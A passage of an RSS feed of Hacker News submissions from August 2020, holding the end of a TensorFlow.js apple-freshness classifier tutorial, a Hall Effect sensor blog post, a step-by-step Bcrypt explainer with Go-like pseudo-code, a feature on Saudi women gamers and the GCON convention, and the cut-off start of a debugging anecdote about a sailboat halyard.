srcset="https://miro.medium.com/max/552/1*ZDhYu-HrhAZdTcdcdKUn4w.png 276w, https://miro.medium.com/max/1104/1*ZDhYu-HrhAZdTcdcdKUn4w.png 552w, https://miro.medium.com/max/1106/1*ZDhYu-HrhAZdTcdcdKUn4w.png 553w" sizes="553px" data-old-src="https://miro.medium.com/max/60/1*ZDhYu-HrhAZdTcdcdKUn4w.png?q=20"></p></div></div></figure><p id="2528">Here, we got 73% rotten and 26% fresh which seems correct if we look at the apple in the displayed image.</p><p id="2b3d">Now, let us try with the image which is less clear and small as well. Hence, we got the following result:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1080/1*EEZl_gTT9fbYHv544LUwKg.png" width="540" height="362" srcset="https://miro.medium.com/max/552/1*EEZl_gTT9fbYHv544LUwKg.png 276w, https://miro.medium.com/max/1080/1*EEZl_gTT9fbYHv544LUwKg.png 540w" sizes="540px" data-old-src="https://miro.medium.com/max/60/1*EEZl_gTT9fbYHv544LUwKg.png?q=20"></p></div></div></figure><p id="7e4e">We can notice that the model gives horribly wrong predictions here. If we look at the apple in the image, it seems quite fresh. But the model predicts it like 95% rotten. This is not the model’s fault as we have trained using a compact algorithm with the images which were clearer and the apple itself took a large part of the space in the image. Thus, it could not predict the image in which the image of the apple was less clear and tiny.</p><p id="1927">Hence in order to make the model more efficient, we need to train it with images taking various dimensions into consideration as well.</p><p id="84b8">This is just a quick model that was implemented in order to inspire and motivate you to learn about image classifiers on a browser using TensorFlow.js technology. You can surely improve the model as well as algorithm and predict more complex images.</p><p id="d4da">In this tutorial, we learned how to use Microsoft Custom Vision to train and generate a simple image classification model to deploy as a browser-based application.</p><p id="64a7">We used this trained model to classify between rotten and fresh apple in images. In order to classify these images, we used the TensorFlow.js module in the browser.</p><p id="6096">We can use the same configuration to train a model for different kinds of classification tasks (kinds of animals, plants, etc). The implementation of a web app using Node.js was also easy and simple to understand. No hardcore stuff here.</p><p id="39e9">For the next step, you can pick other images to classify. You can make use of a normal food algorithm, select advanced training modules, gather more raw image datasets for training, etc. You can implement a model for identifying and classifying more complex target objects with more variables and offsets.</p><p id="66a9"><em>Peace out folks!</em></p></div></div></section></div>]]>
            </description>
            <link>https://heartbeat.fritz.ai/image-classification-made-easy-in-the-browser-with-tensorflow-js-82d016f603a8</link>
            <guid isPermaLink="false">hacker-news-small-sites-24260374</guid>
            <pubDate>Mon, 24 Aug 2020 13:23:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Is Hall Effect?]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24260372">thread link</a>) | @maisies
<br/>
August 24, 2020 | https://www.ixthus.co.uk/blog/detail.php?aid=71&did=What-is-Hall-Effect? | <a href="https://web.archive.org/web/*/https://www.ixthus.co.uk/blog/detail.php?aid=71&did=What-is-Hall-Effect?">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
  <p><img src="https://www.ixthus.co.uk/images/uploadpics/Euro%20XPD%20D-Shaft.jpg" alt="What is Hall Effect?">
  </p><p> <strong>Hall Effect is a type of position sensing technology which uses magnetic fields to determine the position of an object.</strong></p><p>Hall Effect is the most popular type of measuring using a
magnetic field and are very popular with various industries.</p>

<p>We have a range of <a href="https://www.ixthus.co.uk/test-and-measurement-sensors/detail.php?sid=2&amp;did=Non-Contacting-Rotary-Position-Sensors" target="_blank"><b>Hall Effect sensors</b></a> in our portfolio
which offer programmable angles and are available in different sizes
</p>
<h2><u>What is Hall Effect?</u>
</h2>
<p>Hall Effect is the technology inside the sensor. It was
discovered in 1879 by Edwin Hall – an American physicist. The discovery was so
far ahead of it’s time that there was no use for it until decades later when
technology had moved further along and people had a wider understanding of
semiconducting and materials. </p>
<p>Hall Effect Sensors consist of a piece of semiconductor
material attached to a circuit causing a current to flow through it. When this
is placed on a magnetic field, the magnetic flux will exert a force onto the
semiconductor which then deflects charge carriers and electrons forcing them to
one side of the semiconductor and the positive charge will be forced to the
opposite side of the semiconductor. As the electrons are forced to the sides,
they produce voltage between to two sides of the semiconductor perpendicular to
the flow of current. This is called the Hall Effect. The size of the voltage
can be measured and an accurate reading can give position of an object. </p>
<p>In a Hall Effect sensor the magnet causing the magnetic
field disturbance is attached to an object which is moving. As the object
moves, the magnet moves, altering the magnetic field, which disturbs the
electrons which gives a voltage reading. The change in the voltage will be used
to determine the position of the object connected to the magnet. </p>
<p>In a rotary Hall Effect sensor the magnets are mounted in an
“x” format to provide continuous rotation. &nbsp;
</p>
<h2><u>Advantages of Hall Effect Sensors</u>
</h2>
<p>The main advantage of Hall effect sensors and the reason
they are so popular is that there are no wearing parts within the technology,
they are completely non-contacting (or non touching) this gives the technology
infinite life. </p>
<p>Other advantages of using Hall effect sensors are;</p>
<p><span>·<span times="" new="" roman""="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span>Highly reliable 
</p>
<p><span>·<span times="" new="" roman""="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span>Pre-programmable electrical outputs
</p>
<p><span>·<span times="" new="" roman""="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span>High speed operation
</p>
<p><span>·<span times="" new="" roman""="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span>Ability to work in high temperature environments
</p>
<h2><u>What is a Hall Effect Sensor used for?</u>
</h2>
<p>Hall Effect sensors are used throughout many different
industries where precise measurement and high reliability is key, some
application examples are;</p>
<p><span>·<span times="" new="" roman""="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span>Vehicle applications 
</p>
<p><span>·<span times="" new="" roman""="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span>Wheel speed sensors
</p>
<p><span>·<span times="" new="" roman""="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span>Throttle position sensors
</p>
<p><span>·<span times="" new="" roman""="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span>Crankshaft or cam shaft position measurement 
</p>
<p><span>·<span times="" new="" roman""="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span>Steering systems on agricultural machinery
</p>
<p><span>·<span times="" new="" roman""="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span>Processing and packaging machines
</p>
<p><span>·<span times="" new="" roman""="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span>Marine applications 
</p>
<p><span>·<span times="" new="" roman""="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span>Wind direction measurement
</p>
<p><span>·<span times="" new="" roman""="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</span></span>CCTV camera angle measurement
</p>
<h2><u>Hall Effect Sensors from Ixthus </u>
</h2>
<p>We have a range of <a href="https://www.ixthus.co.uk/test-and-measurement-sensors/detail.php?sid=2&amp;did=Non-Contacting-Rotary-Position-Sensors"><b>Hall Effect rotary sensors</b></a>. Some of these
come from our sister company Variohm. They are available in various sizes and
have the option for programmable angles. 
</p>
<p>Although Hall Effect sensor can be more expensive than
contacting options, they have a much longer life and therefore require little
to no maintenance costs and rarely require replacing. </p>
<p>If you have an application for a Hall effect sensor please
contact us and we will help you find the right sensor. </p>
      <p>For more information  please contact: Ixthus Instrumentation Email: sales@ixthus.co.uk Tel:+44 (0) 1327 &nbsp;353437 Fax: +44 (0)   1327 353564</p>
      <p>Article date: Mon, 24 Aug 2020 13:10:10 +0100 GMT</p><p><strong>Share this on Social Media</strong></p>

      <p>Title:<a href="https://www.ixthus.co.uk/blog/detail.php?aid=71&amp;did=What-is-Hall-Effect?">What is Hall Effect?</a></p>
      <p>[<a href="https://www.ixthus.co.uk/blog/index.php">BACK</a>]</p>
      
 
 
</div></div>]]>
            </description>
            <link>https://www.ixthus.co.uk/blog/detail.php?aid=71&amp;did=What-is-Hall-Effect?</link>
            <guid isPermaLink="false">hacker-news-small-sites-24260372</guid>
            <pubDate>Mon, 24 Aug 2020 13:22:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bcrypt Step by Step]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24260341">thread link</a>) | @lanecwagner
<br/>
August 24, 2020 | https://qvault.io/2020/08/24/bcrypt-step-by-step/ | <a href="https://web.archive.org/web/*/https://qvault.io/2020/08/24/bcrypt-step-by-step/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p>Bcrypt is a <a href="https://qvault.io/2019/12/30/very-basic-intro-to-key-derivation-functions-argon2-scrypt-etc/">key derivation function</a>, which can be thought of as a slow <a href="https://qvault.io/2020/01/01/very-basic-intro-to-hash-functions-sha-256-md-5-etc/">hash function</a>. Its purpose is to <em>slowly</em> convert a piece of input data to a fixed-size, deterministic, and unpredictable output. A common use-case is to convert a password into an n-bit cryptographic key, which can then be used for safe authentication. </p>



<p>Here at <a href="https://classroom.qvault.io/">Qvault,</a> we use Bcrypt in our security systems. Bcrypt is a very popular password hashing function, so much so that it’s the hash function we currently teach the implementation of in our <a href="https://classroom.qvault.io/">Practical Cryptography</a> course.</p>



<h2>What Bcrypt Looks Like</h2>



<p>Using Bcrypt on the password <em>myPassword123</em> would produce something like the following:</p>



<pre><strong><em>myPassword123</em> </strong>-&gt;
$2y$12$vUw4OU4EAl4w4vC6/lA33OtDSYGhiIdekdT9iOoSs9/ckwrffaEui</pre>



<p>That output can be used to compare against future hashes against to see if the original data matches.</p>



<h2>Why not compare passwords directly?</h2>



<p>In web development,<em> </em>it is insecure to store user’s passwords in plain text. If an attacker were to gain access to the server’s database they could find raw email/password combinations and use them to attack the same users on other sites. </p>



<p>At the <em>very least</em> we must hash user’s passwords, but hash functions like <a href="https://qvault.io/2020/07/08/how-sha-2-works-step-by-step-sha-256/">SHA-2</a> and MD5 are too fast to be secure. Using a KDF like Bcrypt provides security benefits over fast hashes because it is computationally expensive and slow. If an attacker gains access to a database of password hashes made with fast algorithms it is easy for them to “reverse” the hashes by guessing different inputs and seeing if the outputs match.</p>



<p>For example, let’s say the attacker finds the following entry in a database:</p>



<pre>user@gmail.com 5906ac361a137e2d286465cd6588ebb5ac3f5ae955001100bc41577c3d751764</pre>



<p>They can try hashing common passwords like:</p>



<pre>password1 -&gt;
0b14d501a594442a01c6859541bcb3e8164d183d32937b851835442f69d5c94e
password2 -&gt;
6cf615d5bcaac778352a8f1f3360d23f02f34ec182e259897fd6ce485d7870d4
password3 -&gt; 5906ac361a137e2d286465cd6588ebb5ac3f5ae955001100bc41577c3d751764</pre>



<p><br>The password, <code>password3</code>, produced a matching hash! Now the attacker knows that <code>user@gmail.com</code> is likely to use the password <code>password3</code> on other sites and can go hack other accounts. This is only possible because the attacker is able to quickly compute many hashes per second and guess millions of potential passwords.</p>



<p>A slow KDF like Bcrypt solves this problem.</p>



<h2>Bcrypt Output Format</h2>



<pre>$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
\___/\__/\_____________________________/\___________________________________/
Alg   Cost                  Salt                                            Hash</pre>



<ul><li><code>2a</code>: The hash algorithm identifier (Bcrypt)</li><li><code>10</code>: Cost factor (2<sup><code>10</code></sup>&nbsp;= 1,024 rounds of key expansion)</li><li><code>N9qo8uLOickgx2ZMRZoMye</code>: 16-byte (128-bit) salt, base64 encoded to 22 characters</li><li><code>IjZAgcfl7p92ldGxad68LJZdL17lhWy</code>: 24-byte (192-bit) hash, base64 encoded to 31 characters</li></ul>



<p>Direct from <a aria-label="Wikipedia (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Bcrypt#Description" target="_blank">Wikipedia</a></p>



<h2>Bcrypt Explained Step by Step</h2>



<p>Bcrypt can be visualized with the following Go-like pseudo code:</p>



<pre><code lang="go">func bcrypt(cost int, salt [16]byte, password [72]byte) (hash string) {
	// Initialize Blowfish state with expensive key setup algorithm
	// This is the slow part of the algorithm
	pEighteenSubkeys, sFourSubBoxes := expensiveBlowfishSetup(cost, salt, password)

	// Repeatedly encrypt the text "OrpheanBeholderScryDoubt" 64 times
	// 24 bytes = three 64-bit blocks
	ctext := "OrpheanBeholderScryDoubt"
	for i := 0; i &lt; 64; i++ {
		// Encrypt using standard Blowfish in ECB mode
		ctext = encryptECB(pEighteenSubkeys, sFourSubBoxes, ctext)
	}

	// return the version, cost, salt, and ctext in the proper format
	return "$2a${cost}${salt}{ctext}"
}</code></pre>



<p>As you can see, Bcrypt depends heavily on the <a href="https://en.wikipedia.org/wiki/Blowfish_(cipher)" rel="noopener">Blowfish</a> cipher. Put simply, Bcrypt is an expensive key expansion coupled with Blowfish encryption.</p>



<p>The <code>expensiveBlowfishSetup</code> function can be understood by following pseudo code:</p>



<pre><code lang="go">// pEighteenSubkeys: array of 18 subkeys
// sFourSubBoxes: Four substitution boxes
// Each S-Box is a 256-length array of uint32
func expensiveBlowfishSetup(cost int, salt [16]byte, password [72]byte) (pEighteenSubkeys [18]uint32, sFourSubBoxes [4][256]uint32) {
	// Initialize arrays
	pEighteenSubkeys := [18]uint32
	sFourSubBoxes := [4][256]uint32

	// Fill pEighteenSubkeys and sFourSubBoxes with the hex digits of pi 
	// This initial state works as in the original Blowfish algorithm
	// it populates the P-array and S-box entries with the fractional part of pi in hexadecimal
	pEighteenSubkeys = fillWithPi(pEighteenSubkeys)
	sFourSubBoxes = fillWithPi(sFourSubBoxes)

	// Permutate P and S based on the password and salt
	pEighteenSubkeys, sFourSubBoxes = expandKey(pEighteenSubkeys, sFourSubBoxes, salt, password)

	// This is the "Expensive" part of the "Expensive Key Setup"
	// Otherwise the key setup would be identical to Blowfish
	// Expand the key an exponentially increasing number of times
	// depending on the cost factor
	for i := 0; i &lt; math.Pow(2, cost); i++ {
		pEighteenSubkeys, sFourSubBoxes = expandKey(pEighteenSubkeys, sFourSubBoxes, 0, password)
		pEighteenSubkeys, sFourSubBoxes = expandKey(pEighteenSubkeys, sFourSubBoxes, 0, salt)
	}

	return pEighteenSubkeys, sFourSubBoxes
}</code></pre>



<p><code>The expandKey function</code> is executed an exponentially increasing number of times depending on the value of the <code>cost</code> parameter. The <code>expandKey</code> function is explained by the following pseudo-code:</p>



<pre><code lang="go">func expandKey(pEighteenSubkeys [18]uint32, sFourSubBoxes [4][256]uint32, salt [16]byte, password [72]byte) (
	pEighteenSubkeys [18]uint32, sFourSubBoxes [4][256]uint32
	) {

	// Mix password into the pEighteenSubkeys array
	// by XORing password with subkeys
	for i := 0; i &lt; 18; i++{
		// treat the password as cyclic, XOR 32 bit chunks of password with subkeys
		pEighteenSubkeys[i] ^= password[i % 18]
	}
 
   // Treat the 128-bit salt as two 64-bit halves 
   saltHalf[0] = salt[0:63]
   saltHalf[1] = salt[64:127]

   // Initialize an 8-byte (64-bit) buffer with all zeros.
   block := [8]byte

   // Mix internal state into P-boxes   
   for i := 0; i &lt; 9; i++ {
	  // XOR 64-bit block with a 64-bit salt half
	  // Each iteration alternating between saltHalf[0], and saltHalf[1]
      block ^= saltHalf[(i-1) mod 2]

	  // Encrypt block using current key schedule with blowfish block encryption
	  block = Encrypt(pEighteenSubkeys, sFourSubBoxes, block)
	  
	  // Split block and use as new subkeys
      pEighteenSubkeys[2*i] = block[0:31]
	  pEighteenSubkeys[2*i + 1] = block[32:63]
   }

   // Mix encrypted state into the internal S-boxes of state
   for i := 0; i &lt; 4; i ++ {
      for j := 0; j &lt; 127; j++ {
		// Encrypt block using blowfish block encryption
		// where salt[i] is 64 bit chunks
        block = Encrypt(pEighteenSubkeys, sFourSubBoxes, block ^ salt[i])
        sFourSubBoxes[2*i] = block[0:31]
		sFourSubBoxes[2*i + 1] = block[32:63]
	  }
	}
    return pEighteenSubkeys, sFourSubBoxes
}</code></pre>



<p>It helps me to visualize the details of the pseudo-code by using a more “real” programming syntax like Go. If that doesn’t help you then take a look at the code on the <a aria-label="Wikipedia (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Bcrypt#Algorithm" target="_blank">Wikipedia</a> page here.</p>



<div><div>
<h2>Thanks For Reading!</h2>



<p>Follow us on Twitter <a href="https://twitter.com/q_vault" rel="noopener">@q_vault</a> if you have any questions or comments</p>



<p>Take game-like coding courses on <a href="https://classroom.qvault.io/#/">Qvault Classroom</a></p>



<p><a href="https://mailchi.mp/5c7f5c281bbe/qvault-newsletter-subscribe" rel="noopener">Subscribe</a> to our Newsletter for more educational articles</p>
</div></div>

		</div></div>]]>
            </description>
            <link>https://qvault.io/2020/08/24/bcrypt-step-by-step/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24260341</guid>
            <pubDate>Mon, 24 Aug 2020 13:19:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Saudi Arabia's women gamers want to be taken seriously]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24260304">thread link</a>) | @leoschwartz
<br/>
August 24, 2020 | https://restofworld.org/2020/you-just-got-pwned-habibi/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2020/you-just-got-pwned-habibi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>In April 2012, three college juniors — Felwa, Tasnim, and Najla — waited anxiously on the campus of Prince Sultan University in Riyadh. For the previous six months, their lives had been consumed by the pursuit of a single, radical idea: frustrated that women, year after year, were barred from the annual Gamers’ Day convention, <a href="http://gamersday.com/en/about-us.php#:~:text=Gamers'%20Day%20is%20a%20gaming,numbers%20of%20visitors%20and%20exhibitors">the largest annual gaming convention in Saudi Arabia</a>, they had decided to launch the first-ever gamers’ convention for women in the kingdom. As the organizers hurried around counting consoles and hanging posters near stalls, they wondered whether anyone would show up.</p>



<p>Over the past decade, Saudi Arabia’s gaming scene has dramatically evolved, especially for women. In the early 2000s, the country had strict moral regulations on entertainment, and games were mostly sold in a gray market or through unofficial channels. Areej, a 23-year-old university graduate, picked up her interest in gaming from her father, who once frequented the informal neighborhood stores that sold pirated copies of popular games for 10 riyals ($2). “He played Japanese and English games, even though he didn’t even understand English back then,” she recalled. “He would keep dictionaries around while playing. That’s actually how he learned the language.” Areej hopes to become a “localizer,” a job that entails translating English-language games into Arabic. A decade ago, this wouldn’t have been possible.&nbsp;</p>



<p>After Sony’s 2007 release of the PlayStation 3 in the kingdom, the gaming industry began to take shape in Saudi Arabia. The first <a href="https://www.gamersday.com/en/">Gamers’ Day</a> took place in 2008, and it now draws upward of 60,000 male visitors over the course of four days. The convention presents video game companies with a lucrative opportunity to demo their latest equipment and products; devoted players, in turn, get to try out highly anticipated games that have not yet been released. In 2012, as the three girls were setting up Girls Con (or GCON as it would come to be known), the industry was estimated to have a global revenue stream of $70 billion.</p>



<p>In the months prior to GCON, Tasnim, the only one in the group with work experience, took the lead pitching sponsorship proposals to the all-male staffs at Nintendo and PlayStation Arabia. Without any real data on female gamers in the Middle East, and with barely any on girl gamers in North America, she had pitched on the assumption that the <a href="https://newzoo.com/insights/articles/male-and-female-gamers-how-their-similarities-and-differences-shape-the-games-market/">gender ratio for gamers in Saudi Arabia</a> was likely the same as in the United States: 47%. But there was no way to prove this. Until then, the world of female gaming in Saudi Arabia was a private one, usually set in the intimacy of people’s bedrooms.</p>



<p>“You could find girls who played video games, just for fun or on their mobile phone, but I had no idea how many girls were into hardcore gaming,” Felwa said. While mobile games like Angry Birds and Candy Crush were popular — the Kingdom boasts a <a href="https://www2.deloitte.com/content/dam/Deloitte/xe/Documents/technology-media-telecommunications/GMCS-whitepaper.pdf">90% cell phone penetration rate</a> — Felwa was curious to see how many girls had grown up like her playing Tomb Raider, Tekken, and League of Legends.</p>



<p>When the hall flooded with nearly 3,000 women, some as young as 13 and others in their 50s, it was a shock. “I definitely did not expect moms to come,” Felwa said. Back then, it was mandatory for women to wear the traditional black abaya, and often a headscarf, while in public. It was only when the women walked through the doors into the all-female space that their abayas slipped off to reveal an array of cosplay costumes.</p>



<p>Inside the hallway, girls who were expected to behave discreetly at all times rushed around trying to play as many PlayStation- and Nintendo-sponsored games as they could. On one side of the hall, first-time cosplayers shared a rare opportunity to express their fandom. On the other, 150 people stood in a rowdy line waiting their turn in a Call of Duty tournament.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/08/Ghada_AlMoqbel_25-40x27.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/08/Ghada_AlMoqbel_25-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/08/Ghada_AlMoqbel_25-400x267.jpg 400w, https://restofworld.org/wp-content/uploads/2020/08/Ghada_AlMoqbel_25-600x400.jpg 600w, https://restofworld.org/wp-content/uploads/2020/08/Ghada_AlMoqbel_25-1600x1067.jpg 1600w, https://restofworld.org/wp-content/uploads/2020/08/Ghada_AlMoqbel_25-2800x1867.jpg 2800w, " sizes="(max-width: 640px) 100vw, (max-width: 992px) calc(100vw - 40px), (max-width: 1140px) calc(100vw - 290px), calc(100vw - ((100vw - 640px)/2))" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<hr>



<p><strong>While the Middle</strong> <strong>East</strong> represents only a small portion of the international gaming industry, it is a rapidly expanding market. In 2017, the countries of the Gulf Cooperation Council accounted for around $693 million of gaming revenue, most related to esports. By 2021, that number is expected to exceed <a href="https://www.strategyand.pwc.com/m1/en/press-releases/2020/gcc-gaming-market.html">$821 million</a>, boosted in part by the pandemic-induced lockdown.&nbsp;</p>



<p>Saudi Arabia expects to be at the forefront<strong> </strong>of that expansion. In a country where roughly 50% of the population is under 30, gaming has become an emblem for a generation of young Saudis.&nbsp;</p>



<p>In recent years, Prince Faisal bin Bandar, a young member of the royal family raised on Atari consoles, set out to make Saudi Arabia the Middle East’s hub for the $160 billion gaming industry. Under his leadership, the<strong> </strong><a href="https://safeis.sa/">Saudi Arabian Federation for Electronic and Intellectual Sports (SAFEIS)</a> aims for esports revenue to amount to 1% of the country’s GDP (approximately $22 billion) by 2030.</p>



<p>While Saudi Arabia was a late arrival to esports, its male players have already made their mark. Since 2017, Prince Faisal and the federation have been scouting, coaching, and sending professional esports players to competitions across the world. Mossad Al-Dossary, then 18, made headlines in 2018 after <a href="https://www.ea.com/games/fifa/news/msdossary-triumphs-fifa-eworld-cup-grand-final-london">winning first place</a> at the FIFA eWorld Cup in London, taking home a $250,000 cash prize.&nbsp;</p>



<p>Female gamers, however, are still finding their way. Women in Felwa, Tasnim, and Najla’s generation grew up under the watch of religious police, in a time when public spaces were segregated by gender. While women still do not have the same rights as men, Crown Prince Mohammed bin Salman<strong> </strong>has relaxed male-guardianship rules and mandatory dress codes and legalized certain forms of entertainment for women. “I still struggle to convey what Saudi Arabia was like at that time to those that haven’t had that experience,” Tess said. There were no theaters, and sports facilities for girls were limited, “So, mostly, we had to stay inside and make do with what we had — and games were all that we had.”</p>



<p>Raghad, 23, currently works for a mining company, but she dreams of becoming a voice actor for video games. Although she’s never lived anywhere but Saudi Arabia, she has a distinctly squeaky American accent — a curious trait she picked up from a fifth-grade teacher who had lived in the U.S. and a torrent of YouTube videos. She is considering taking voice-acting classes online, assuming she can find any, because she’s not allowed to travel abroad alone to study until after she’s married. It’s still common to meet women who come to gaming as a result of these kinds of restrictions, as Felwa, Tasnim, and Najla did years ago. This is why going to GCON can be such a powerful experience.&nbsp;</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/08/GettyImages-1010892174-40x27.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/08/GettyImages-1010892174-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/08/GettyImages-1010892174-400x267.jpg 400w, https://restofworld.org/wp-content/uploads/2020/08/GettyImages-1010892174-600x400.jpg 600w, https://restofworld.org/wp-content/uploads/2020/08/GettyImages-1010892174-1600x1067.jpg 1600w, https://restofworld.org/wp-content/uploads/2020/08/GettyImages-1010892174-2800x1867.jpg 2800w, " sizes="(max-width: 640px) 100vw, (max-width: 992px) calc(100vw - 40px), (max-width: 1140px) calc(100vw - 290px), calc(100vw - ((100vw - 640px)/2))" alt="Mossad Al-Dossary (right) made headlines in 2018 after winning first place at the FIFA e-World Cup in London, taking home a $250,000 cash prize.&nbsp;">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				<span itemprop="copyrightHolder">Ben Hoskins/FIFA via Getty Images</span>
			</figcaption>
		</figure>


<hr>



<p><strong>In 2018, Felwa,</strong> Tasnim, and Najla handed GCON over to Ghada Al-Moqbel, who attended her first GCON in 2013 at the age of 18. Now she leads Saudi Arabia’s women’s gaming community. This occurred right after bin Salman took control and began dismantling the country’s gender segregation. For Ghada and the wider community of female gamers, these changes forced them to decide whether they wanted to stay on the fringes of the gaming community or take a more central role. In 2018, GCON organizers met regularly to discuss whether there was still value in creating an exclusively female space for gaming.</p>



<figure><blockquote><p>“We had to stay inside and make do with what we had — and games were all that we had.”</p></blockquote></figure>



<p>For Ghada, the answer was yes. While attitudes toward female gamers have improved, parts of Saudi society remain uncomfortable with this burgeoning culture. When GCON first launched, participants were criticized for indulging in supposedly immoral behavior, and social media accounts of female gamers were routinely hacked. Likewise, after the first Comic Con in Jeddah, in 2017, a<a href="https://twitter.com/hashtag/%D9%83%D9%88%D9%85%D9%8A%D9%83%D9%88%D9%86_%D8%AD%D9%81%D9%84_%D8%B9%D8%A8%D8%AF%D8%A9_%D8%A7%D9%84%D8%B4%D9%8A%D8%B7%D8%A7%D9%86_%D8%A8%D8%AC%D8%AF%D9%87?src=hashtag_click"> hashtag</a> accusing participants of being Satan worshippers flooded social media along with pictures of women who had dressed up for cosplay. Thanks in part to the continuing fear of societal backlash, many Saudi women still advocate for all-female events.&nbsp;</p>



<p>But like the kingdom, GCON is also evolving. “We’re not just entertainment anymore,” Ghada said. “It’s about empowering and enabling women to be serious in the gaming and esports industry.” In mid-August, Princess Nourah bint Abdulrahman University, the largest women-only university in the world, <a href="https://www.arabnews.com/node/1718151/saudi-arabia">announced</a> that it would be creating a degree program for animation.</p>



<p>Since Ghada took over, the organization has expanded, hosting regular skill-development workshops as well as the annual convention. While she has maintained GCON’s focus on female gamers, she has been open to collaborating with their male peers. In 2017, organizers from Gamer’s Day worked with GCON to arrange their first mixed-gender gaming event. While 2020 was supposed to be a big year for Ghada and GCON, Covid-19 disrupted their plans. Nonetheless, it’s unlikely that GCON — a force that arose in far more challenging terrain — will be going away anytime soon.</p>
		</div></div>]]>
            </description>
            <link>https://restofworld.org/2020/you-just-got-pwned-habibi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24260304</guid>
            <pubDate>Mon, 24 Aug 2020 13:15:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Debugging a Launch-Blocking Issue]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24260288">thread link</a>) | @otras
<br/>
August 24, 2020 | https://alexanderell.is/posts/debugging/ | <a href="https://web.archive.org/web/*/https://alexanderell.is/posts/debugging/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="wrapper">
            <article>
                <header>
                    
                    
                    <h2>
                    Aug 23, 2020
                    · 597 words
                    · 3 minutes read
                      <span>
                            
                      </span>
                    </h2>
                </header>
                
                <section id="post-body">
                    <p>It was around 4PM a few Fridays ago when I heard that something had gone wrong, and I volunteered (was volunteered?) to help fix it. There was a broken internal configuration that blocked future immediate work for an upcoming launch that same day. I hadn’t worked on this particular system, just similar things before, but because I’m decent at visualizing and debugging these things, my colleague asked me for help with it.</p>
<p>In retrospect, it was something that probably said “this should never happen” in the documentation. I scoped it out with my colleague who was more familiar with it, since he had been working on it right before things went south and was convinced he had caused the bug in one of his setup steps. He was more familiar with a similar but slightly different configuration where this issue wasn’t even possible, and he wasn’t aware that an extra fail-safe was needed to avoid what he thought had gone wrong.</p>
<p>I looked at the system, confirmed the problem matched what he thought it was, and started thinking about how to fix it. Initially I tried using a basic tool, but it didn’t work (issue of scale). After a quick search online, I found a few potential solutions for the same issue, but they all seemed either too complicated or involved some tooling we didn’t have readily available.</p>
<p>After a little more digging and thinking, it turned out we had some existing tool that we could reuse to fix the incorrect configuration, even though it was designed for a different use (who knows why it was still lying around).  After some paired work on the problem, we were able to go inside the system and correct the configuration, which unblocked my colleague and the subsequent launch.</p>
<p>To help encourage our blameless culture, after some very light teasing I brought up the fact that anyone could have easily made this mistake – myself very much included – and helped ensure that the extra fail-safe was in place for whoever used it next.</p>
<hr>
<p>I’ve been intentionally vague with the story because it wasn’t a software bug at work; it was a lake-side sailboat problem. My cousin had accidentally pulled one end of his sailboat’s halyard up through the mast while rigging the boat, and the end he needed threaded through at the bottom was instead at the top of the 20 foot mast.</p>
<p><img src="https://alexanderell.is/posts/debugging/skied-halyard.png" alt="Visualization of skied halyard"></p>
<center>
<em>Visualization of what went wrong (but not to scale)</em>
</center>

